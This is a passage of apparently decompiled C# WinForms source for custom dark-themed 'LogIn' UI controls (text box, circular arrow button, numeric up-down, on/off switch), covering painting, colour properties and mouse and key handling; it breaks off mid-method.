				this.TB.Width = this.Width - 10;
				bool multiline = this._Multiline;
				if (multiline)
				{
					this.TB.Height = this.Height - 11;
				}
				else
				{
					this.Height = this.TB.Height + 11;
				}
				base.OnResize(e);
			}
		}

		public void SelectAll()
		{
			this.TB.Focus();
			this.TB.SelectAll();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.TB.Focus();
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public LogInNormalTextBox()
		{
			LogInNormalTextBox.__ENCAddToList(this);
			this.State = MouseState.None;
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._Style = LogInNormalTextBox.Styles.NotRounded;
			this._TextAlign = HorizontalAlignment.Left;
			this._MaxLength = 32767;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
			this.TB = new TextBox();
			this.TB.Height = 190;
			this.TB.Font = new Font("Segoe UI", 10f);
			this.TB.Text = this.Text;
			this.TB.BackColor = Color.FromArgb(42, 42, 42);
			this.TB.ForeColor = Color.FromArgb(255, 255, 255);
			this.TB.MaxLength = this._MaxLength;
			this.TB.Multiline = false;
			this.TB.ReadOnly = this._ReadOnly;
			this.TB.UseSystemPasswordChar = this._UseSystemPasswordChar;
			this.TB.BorderStyle = BorderStyle.None;
			Control arg_16E_0 = this.TB;
			Point location = new Point(5, 5);
			arg_16E_0.Location = location;
			this.TB.Width = checked(this.Width - 35);
			this.TB.TextChanged += new EventHandler(this.OnBaseTextChanged);
			this.TB.KeyDown += new KeyEventHandler(this.OnBaseKeyDown);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			this.TB.BackColor = Color.FromArgb(42, 42, 42);
			this.TB.ForeColor = Color.FromArgb(255, 255, 255);
			switch (this._Style)
			{
			case LogInNormalTextBox.Styles.Rounded:
			{
				GraphicsPath graphicsPath;
				graphics2.FillPath(new SolidBrush(Color.FromArgb(42, 42, 42)), graphicsPath);
				graphics2.DrawPath(new Pen(new SolidBrush(Color.FromArgb(35, 35, 35)), 2f), graphicsPath);
				graphicsPath.Dispose();
				break;
			}
			case LogInNormalTextBox.Styles.NotRounded:
			{
				Graphics arg_10B_0 = graphics2;
				Brush arg_10B_1 = new SolidBrush(Color.FromArgb(42, 42, 42));
				Rectangle rect = checked(new Rectangle(0, 0, this.Width - 1, this.Height - 1));
				arg_10B_0.FillRectangle(arg_10B_1, rect);
				Graphics arg_144_0 = graphics2;
				Pen arg_144_1 = new Pen(new SolidBrush(Color.FromArgb(35, 35, 35)), 2f);
				rect = new Rectangle(0, 0, this.Width, this.Height);
				arg_144_0.DrawRectangle(arg_144_1, rect);
				break;
			}
			}
			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInLogButton : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		private Color _ArcColour;

		private Color _ArrowColour;

		private Color _ArrowBorderColour;

		private Color _BorderColour;

		private Color _HoverColour;

		private Color _PressedColour;

		private Color _NormalColour;

		[Category("Colours")]
		public Color ArcColour
		{
			get
			{
				return this._ArcColour;
			}
			set
			{
				this._ArcColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowColour
		{
			get
			{
				return this._ArrowColour;
			}
			set
			{
				this._ArrowColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowBorderColour
		{
			get
			{
				return this._ArrowBorderColour;
			}
			set
			{
				this._ArrowBorderColour = value;
			}
		}

		[Category("Colours")]
		public Color HoverColour
		{
			get
			{
				return this._HoverColour;
			}
			set
			{
				this._HoverColour = value;
			}
		}

		[Category("Colours")]
		public Color PressedColour
		{
			get
			{
				return this._PressedColour;
			}
			set
			{
				this._PressedColour = value;
			}
		}

		[Category("Colours")]
		public Color NormalColour
		{
			get
			{
				return this._NormalColour;
			}
			set
			{
				this._NormalColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInLogButton.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInLogButton.__ENCList.Count == LogInLogButton.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInLogButton.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInLogButton.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInLogButton.__ENCList[num] = LogInLogButton.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInLogButton.__ENCList.RemoveRange(num, LogInLogButton.__ENCList.Count - num);
						LogInLogButton.__ENCList.Capacity = LogInLogButton.__ENCList.Count;
					}
					LogInLogButton.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		protected override void OnResize(EventArgs e)
		{
			base.OnResize(e);
			Size size = new Size(50, 50);
			this.Size = size;
		}

		public LogInLogButton()
		{
			LogInLogButton.__ENCAddToList(this);
			this.State = MouseState.None;
			this._ArcColour = Color.FromArgb(43, 43, 43);
			this._ArrowColour = Color.FromArgb(235, 233, 234);
			this._ArrowBorderColour = Color.FromArgb(170, 170, 170);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._HoverColour = Color.FromArgb(0, 130, 169);
			this._PressedColour = Color.FromArgb(0, 145, 184);
			this._NormalColour = Color.FromArgb(0, 160, 199);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(50, 50);
			this.Size = size;
			this.BackColor = Color.FromArgb(54, 54, 54);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			GraphicsPath graphicsPath = new GraphicsPath();
			GraphicsPath graphicsPath2 = new GraphicsPath();
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			Point[] array = new Point[7];
			Point[] arg_5E_0_cp_0 = array;
			int arg_5E_0_cp_1 = 0;
			Point point = new Point(18, 22);
			arg_5E_0_cp_0[arg_5E_0_cp_1] = point;
			Point[] arg_79_0_cp_0 = array;
			int arg_79_0_cp_1 = 1;
			Point point2 = new Point(28, 22);
			arg_79_0_cp_0[arg_79_0_cp_1] = point2;
			Point[] arg_94_0_cp_0 = array;
			int arg_94_0_cp_1 = 2;
			Point point3 = new Point(28, 18);
			arg_94_0_cp_0[arg_94_0_cp_1] = point3;
			Point[] arg_AF_0_cp_0 = array;
			int arg_AF_0_cp_1 = 3;
			Point point4 = new Point(34, 25);
			arg_AF_0_cp_0[arg_AF_0_cp_1] = point4;
			Point[] arg_CA_0_cp_0 = array;
			int arg_CA_0_cp_1 = 4;
			Point point5 = new Point(28, 32);
			arg_CA_0_cp_0[arg_CA_0_cp_1] = point5;
			Point[] arg_E5_0_cp_0 = array;
			int arg_E5_0_cp_1 = 5;
			Point point6 = new Point(28, 28);
			arg_E5_0_cp_0[arg_E5_0_cp_1] = point6;
			Point[] arg_100_0_cp_0 = array;
			int arg_100_0_cp_1 = 6;
			Point point7 = new Point(18, 28);
			arg_100_0_cp_0[arg_100_0_cp_1] = point7;
			Point[] points = array;
			checked
			{
				switch (this.State)
				{
				case MouseState.None:
				{
					Graphics arg_15C_0 = graphics2;
					Brush arg_15C_1 = new SolidBrush(Color.FromArgb(56, 56, 56));
					Rectangle rect = new Rectangle(3, 3, this.Width - 3 - 3, this.Height - 3 - 3);
					arg_15C_0.FillEllipse(arg_15C_1, rect);
					graphics2.DrawArc(new Pen(new SolidBrush(this._ArcColour), 4f), 3, 3, this.Width - 3 - 3, this.Height - 3 - 3, -90, 360);
					Graphics arg_1C5_0 = graphics2;
					Pen arg_1C5_1 = new Pen(this._BorderColour);
					rect = new Rectangle(1, 1, this.Height - 3, this.Height - 3);
					arg_1C5_0.DrawEllipse(arg_1C5_1, rect);
					Graphics arg_1F6_0 = graphics2;
					Brush arg_1F6_1 = new SolidBrush(this._NormalColour);
					rect = new Rectangle(5, 5, this.Height - 11, this.Height - 11);
					arg_1F6_0.FillEllipse(arg_1F6_1, rect);
					graphics2.FillPolygon(new SolidBrush(this._ArrowColour), points);
					graphics2.DrawPolygon(new Pen(this._ArrowBorderColour), points);
					break;
				}
				case MouseState.Over:
				{
					graphics2.DrawArc(new Pen(new SolidBrush(this._ArcColour), 4f), 3, 3, this.Width - 3 - 3, this.Height - 3 - 3, -90, 360);
					Graphics arg_28D_0 = graphics2;
					Pen arg_28D_1 = new Pen(this._BorderColour);
					Rectangle rect = new Rectangle(1, 1, this.Height - 3, this.Height - 3);
					arg_28D_0.DrawEllipse(arg_28D_1, rect);
					Graphics arg_2BE_0 = graphics2;
					Brush arg_2BE_1 = new SolidBrush(this._HoverColour);
					rect = new Rectangle(6, 6, this.Height - 13, this.Height - 13);
					arg_2BE_0.FillEllipse(arg_2BE_1, rect);
					graphics2.FillPolygon(new SolidBrush(this._ArrowColour), points);
					graphics2.DrawPolygon(new Pen(this._ArrowBorderColour), points);
					break;
				}
				case MouseState.Down:
				{
					graphics2.DrawArc(new Pen(new SolidBrush(this._ArcColour), 4f), 3, 3, this.Width - 3 - 3, this.Height - 3 - 3, -90, 360);
					Graphics arg_355_0 = graphics2;
					Pen arg_355_1 = new Pen(this._BorderColour);
					Rectangle rect = new Rectangle(1, 1, this.Height - 3, this.Height - 3);
					arg_355_0.DrawEllipse(arg_355_1, rect);
					Graphics arg_386_0 = graphics2;
					Brush arg_386_1 = new SolidBrush(this._PressedColour);
					rect = new Rectangle(6, 6, this.Height - 13, this.Height - 13);
					arg_386_0.FillEllipse(arg_386_1, rect);
					graphics2.FillPolygon(new SolidBrush(this._ArrowColour), points);
					graphics2.DrawPolygon(new Pen(this._ArrowBorderColour), points);
					break;
				}
				}
				graphicsPath.Dispose();
				graphicsPath2.Dispose();
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInNumeric : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		private int MouseXLoc;

		private int MouseYLoc;

		private long _Value;

		private long _Minimum;

		private long _Maximum;

		private bool BoolValue;

		private Color _BaseColour;

		private Color _ButtonColour;

		private Color _BorderColour;

		private Color _SecondBorderColour;

		private Color _FontColour;

		public long Value
		{
			get
			{
				return this._Value;
			}
			set
			{
				bool flag = value <= this._Maximum & value >= this._Minimum;
				if (flag)
				{
					this._Value = value;
				}
				this.Invalidate();
			}
		}

		public long Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value > this._Minimum;
				if (flag)
				{
					this._Maximum = value;
				}
				flag = (this._Value > this._Maximum);
				if (flag)
				{
					this._Value = this._Maximum;
				}
				this.Invalidate();
			}
		}

		public long Minimum
		{
			get
			{
				return this._Minimum;
			}
			set
			{
				bool flag = value < this._Maximum;
				if (flag)
				{
					this._Minimum = value;
				}
				flag = (this._Value < this._Minimum);
				if (flag)
				{
					this._Value = this.Minimum;
				}
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ButtonColour
		{
			get
			{
				return this._ButtonColour;
			}
			set
			{
				this._ButtonColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color SecondBorderColour
		{
			get
			{
				return this._SecondBorderColour;
			}
			set
			{
				this._SecondBorderColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInNumeric.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInNumeric.__ENCList.Count == LogInNumeric.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInNumeric.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInNumeric.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInNumeric.__ENCList[num] = LogInNumeric.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInNumeric.__ENCList.RemoveRange(num, LogInNumeric.__ENCList.Count - num);
						LogInNumeric.__ENCList.Capacity = LogInNumeric.__ENCList.Count;
					}
					LogInNumeric.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			base.OnMouseMove(e);
			this.MouseXLoc = e.Location.X;
			this.MouseYLoc = e.Location.Y;
			this.Invalidate();
			bool flag = e.X < checked(this.Width - 47);
			if (flag)
			{
				this.Cursor = Cursors.IBeam;
			}
			else
			{
				this.Cursor = Cursors.Hand;
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			checked
			{
				bool flag = this.MouseXLoc > this.Width - 47 && this.MouseXLoc < this.Width - 3;
				if (flag)
				{
					bool flag2 = this.MouseXLoc < this.Width - 23;
					if (flag2)
					{
						bool flag3 = this.Value + 1L <= this._Maximum;
						if (flag3)
						{
							this._Value += 1L;
						}
					}
					else
					{
						bool flag3 = this.Value - 1L >= this._Minimum;
						if (flag3)
						{
							this._Value -= 1L;
						}
					}
				}
				else
				{
					this.BoolValue = !this.BoolValue;
					this.Focus();
				}
				this.Invalidate();
			}
		}

		protected override void OnKeyPress(KeyPressEventArgs e)
		{
			base.OnKeyPress(e);
			try
			{
				bool flag = this.BoolValue;
				if (flag)
				{
					this._Value = Conversions.ToLong(Conversions.ToString(this._Value) + e.KeyChar.ToString());
				}
				flag = (this._Value > this._Maximum);
				if (flag)
				{
					this._Value = this._Maximum;
				}
				this.Invalidate();
			}
			catch (Exception arg_64_0)
			{
				ProjectData.SetProjectError(arg_64_0);
				ProjectData.ClearProjectError();
			}
		}

		protected override void OnKeyDown(KeyEventArgs e)
		{
			base.OnKeyDown(e);
			bool flag = e.KeyCode == Keys.Back;
			if (flag)
			{
				this.Value = 0L;
			}
		}

		protected override void OnResize(EventArgs e)
		{
			base.OnResize(e);
			this.Height = 24;
		}

		public LogInNumeric()
		{
			LogInNumeric.__ENCAddToList(this);
			this.State = MouseState.None;
			this._Minimum = 0L;
			this._Maximum = 9999999L;
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._ButtonColour = Color.FromArgb(47, 47, 47);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._SecondBorderColour = Color.FromArgb(0, 191, 255);
			this._FontColour = Color.FromArgb(255, 255, 255);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Font = new Font("Segoe UI", 10f);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
			StringFormat stringFormat = new StringFormat();
			stringFormat.LineAlignment = StringAlignment.Center;
			stringFormat.Alignment = StringAlignment.Center;
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.Clear(this.BackColor);
			graphics2.FillRectangle(new SolidBrush(this._BaseColour), rect);
			Graphics arg_9F_0 = graphics2;
			Brush arg_9F_1 = new SolidBrush(this._ButtonColour);
			checked
			{
				Rectangle rectangle = new Rectangle(this.Width - 48, 0, 48, this.Height);
				arg_9F_0.FillRectangle(arg_9F_1, rectangle);
				graphics2.DrawRectangle(new Pen(this._BorderColour, 2f), rect);
				Graphics arg_FA_0 = graphics2;
				Pen arg_FA_1 = new Pen(this._SecondBorderColour);
				Point point = new Point(this.Width - 48, 1);
				Point arg_FA_2 = point;
				Point point2 = new Point(this.Width - 48, this.Height - 2);
				arg_FA_0.DrawLine(arg_FA_1, arg_FA_2, point2);
				Graphics arg_13C_0 = graphics2;
				Pen arg_13C_1 = new Pen(this._BorderColour);
				point2 = new Point(this.Width - 24, 1);
				Point arg_13C_2 = point2;
				point = new Point(this.Width - 24, this.Height - 2);
				arg_13C_0.DrawLine(arg_13C_1, arg_13C_2, point);
				Graphics arg_178_0 = graphics2;
				Pen arg_178_1 = new Pen(this._FontColour);
				point2 = new Point(this.Width - 36, 7);
				Point arg_178_2 = point2;
				point = new Point(this.Width - 36, 17);
				arg_178_0.DrawLine(arg_178_1, arg_178_2, point);
				Graphics arg_1B5_0 = graphics2;
				Pen arg_1B5_1 = new Pen(this._FontColour);
				point2 = new Point(this.Width - 31, 12);
				Point arg_1B5_2 = point2;
				point = new Point(this.Width - 41, 12);
				arg_1B5_0.DrawLine(arg_1B5_1, arg_1B5_2, point);
				Graphics arg_1F1_0 = graphics2;
				Pen arg_1F1_1 = new Pen(this._FontColour);
				point2 = new Point(this.Width - 17, 13);
				Point arg_1F1_2 = point2;
				point = new Point(this.Width - 7, 13);
				arg_1F1_0.DrawLine(arg_1F1_1, arg_1F1_2, point);
				Graphics arg_241_0 = graphics2;
				string arg_241_1 = Conversions.ToString(this.Value);
				Font arg_241_2 = this.Font;
				Brush arg_241_3 = new SolidBrush(this._FontColour);
				rectangle = new Rectangle(5, 1, this.Width, this.Height);
				arg_241_0.DrawString(arg_241_1, arg_241_2, arg_241_3, rectangle, new StringFormat
				{
					LineAlignment = StringAlignment.Center
				});
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("ToggleChanged")]
	public class LogInOnOffSwitch : Control
	{
		public delegate void ToggleChangedEventHandler(object sender);

		public enum Toggles
		{
			Toggled,
			NotToggled
		}

		public delegate void ToggledChangedEventHandler();

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private LogInOnOffSwitch.ToggleChangedEventHandler ToggleChangedEvent;

		private LogInOnOffSwitch.Toggles _Toggled;

		private int MouseXLoc;

		private int ToggleLocation;

		private Color _BaseColour;

		private Color _BorderColour;

		private Color _TextColour;

		private Color _NonToggledTextColour;

		private Color _ToggledColour;

		private LogInOnOffSwitch.ToggledChangedEventHandler ToggledChangedEvent;

		public event LogInOnOffSwitch.ToggleChangedEventHandler ToggleChanged
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ToggleChangedEvent = (LogInOnOffSwitch.ToggleChangedEventHandler)Delegate.Combine(this.ToggleChangedEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ToggleChangedEvent = (LogInOnOffSwitch.ToggleChangedEventHandler)Delegate.Remove(this.ToggleChangedEvent, value);
			}
		}

		public event LogInOnOffSwitch.ToggledChangedEventHandler ToggledChanged
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ToggledChangedEvent = (LogInOnOffSwitch.ToggledChangedEventHandler)Delegate.Combine(this.ToggledChangedEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ToggledChangedEvent = (LogInOnOffSwitch.ToggledChangedEventHandler)Delegate.Remove(this.ToggledChangedEvent, value);
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color NonToggledTextColourderColour
		{
			get
			{
				return this._NonToggledTextColour;
			}
			set
			{
				this._NonToggledTextColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color ToggledColour
		{
			get
			{
				return this._ToggledColour;
			}
			set
			{
				this._ToggledColour = value;
				this.Invalidate();
			}
		}

		public LogInOnOffSwitch.Toggles Toggled
		{
			get
			{
				return this._Toggled;
			}
			set
			{
				this._Toggled = value;
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInOnOffSwitch.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInOnOffSwitch.__ENCList.Count == LogInOnOffSwitch.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInOnOffSwitch.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInOnOffSwitch.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInOnOffSwitch.__ENCList[num] = LogInOnOffSwitch.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInOnOffSwitch.__ENCList.RemoveRange(num, LogInOnOffSwitch.__ENCList.Count - num);
						LogInOnOffSwitch.__ENCList.Capacity = LogInOnOffSwitch.__ENCList.Count;
					}
					LogInOnOffSwitch.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			base.OnMouseMove(e);
			this.MouseXLoc = e.Location.X;
			this.Invalidate();
			bool flag = e.X < checked(this.Width - 40) && e.X > 40;
			if (flag)
			{
				this.Cursor = Cursors.IBeam;
			}
			else
			{
				this.Cursor = Cursors.Arrow;
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			bool flag = this.MouseXLoc > checked(this.Width - 39);
			if (flag)
			{
				this._Toggled = LogInOnOffSwitch.Toggles.Toggled;
				this.ToggledValue();
			}
			else
			{
				flag = (this.MouseXLoc < 39);
				if (flag)
				{
					this._Toggled = LogInOnOffSwitch.Toggles.NotToggled;
					this.ToggledValue();
				}
			}
			this.Invalidate();
		}

		private void ToggledValue()
		{
			bool flag = this._Toggled > LogInOnOffSwitch.Toggles.Toggled;
			checked
			{
				if (flag)
				{
					bool flag2 = this.ToggleLocation < 100;
					if (flag2)
					{
						this.ToggleLocation += 10;
					}
				}
				else
				{
					bool flag2 = this.ToggleLocation > 0;
					if (flag2)
					{
						this.ToggleLocation -= 10;
					}
				}
				this.Invalidate();
			}
		}

		public LogInOnOffSwitch()
		{
			LogInOnOffSwitch.__ENCAddToList(this);
			this._Toggled = LogInOnOffSwitch.Toggles.NotToggled;
			this.ToggleLocation = 0;
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._NonToggledTextColour = Color.FromArgb(125, 125, 125);
			this._ToggledColour = Color.FromArgb(23, 119, 151);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.DoubleBuffer, true);
			this.BackColor = Color.FromArgb(54, 54, 54);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.Clear(this.BackColor);
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			Graphics arg_56_0 = graphics2;
			Brush arg_56_1 = new SolidBrush(this._BaseColour);
			Rectangle rectangle = new Rectangle(0, 0, 39, this.Height);
			arg_56_0.FillRectangle(arg_56_1, rectangle);
			Graphics arg_87_0 = graphics2;
			Brush arg_87_1 = new SolidBrush(this._BaseColour);
			checked
			{
				rectangle = new Rectangle(this.Width - 40, 0, this.Width, this.Height);
				arg_87_0.FillRectangle(arg_87_1, rectangle);
				Graphics arg_B0_0 = graphics2;
				Brush arg_B0_1 = new SolidBrush(this._BaseColour);
				rectangle = new Rectangle(38, 9, this.Width - 40, 5);
				arg_B0_0.FillRectangle(arg_B0_1, rectangle);
				Point[] array = new Point[13];
				Point[] arg_D3_0_cp_0 = array;
				int arg_D3_0_cp_1 = 0;
				Point point = new Point(0, 0);
				arg_D3_0_cp_0[arg_D3_0_cp_1] = point;
				Point[] arg_ED_0_cp_0 = array;
				int arg_ED_0_cp_1 = 1;
				Point point2 = new Point(39, 0);
				arg_ED_0_cp_0[arg_ED_0_cp_1] = point2;
				Point[] arg_108_0_cp_0 = array;
				int arg_108_0_cp_1 = 2;
				Point point3 = new Point(39, 9);
				arg_108_0_cp_0[arg_108_0_cp_1] = point3;
				Point[] arg_12A_0_cp_0 = array;
				int arg_12A_0_cp_1 = 3;
				Point point4 = new Point(this.Width - 40, 9);
				arg_12A_0_cp_0[arg_12A_0_cp_1] = point4;
				Point[] arg_14B_0_cp_0 = array;
				int arg_14B_0_cp_1 = 4;
				Point point5 = new Point(this.Width - 40, 0);
				arg_14B_0_cp_0[arg_14B_0_cp_1] = point5;
				Point[] arg_16B_0_cp_0 = array;
				int arg_16B_0_cp_1 = 5;
				Point point6 = new Point(this.Width - 2, 0);
				arg_16B_0_cp_0[arg_16B_0_cp_1] = point6;
				Point[] arg_192_0_cp_0 = array;
				int arg_192_0_cp_1 = 6;
				Point point7 = new Point(this.Width - 2, this.Height - 1);
				arg_192_0_cp_0[arg_192_0_cp_1] = point7;
				Point[] arg_1BA_0_cp_0 = array;
				int arg_1BA_0_cp_1 = 7;
				Point point8 = new Point(this.Width - 40, this.Height - 1);
				arg_1BA_0_cp_0[arg_1BA_0_cp_1] = point8;
				Point[] arg_1DC_0_cp_0 = array;
				int arg_1DC_0_cp_1 = 8;
				Point point9 = new Point(this.Width - 40, 14);
				arg_1DC_0_cp_0[arg_1DC_0_cp_1] = point9;
				Point[] arg_1F8_0_cp_0 = array;
				int arg_1F8_0_cp_1 = 9;
				Point point10 = new Point(39, 14);
				arg_1F8_0_cp_0[arg_1F8_0_cp_1] = point10;
				Point[] arg_21A_0_cp_0 = array;
				int arg_21A_0_cp_1 = 10;
				Point point11 = new Point(39, this.Height - 1);
				arg_21A_0_cp_0[arg_21A_0_cp_1] = point11;
				Point[] arg_23B_0_cp_0 = array;
				int arg_23B_0_cp_1 = 11;
				Point point12 = new Point(0, this.Height - 1);
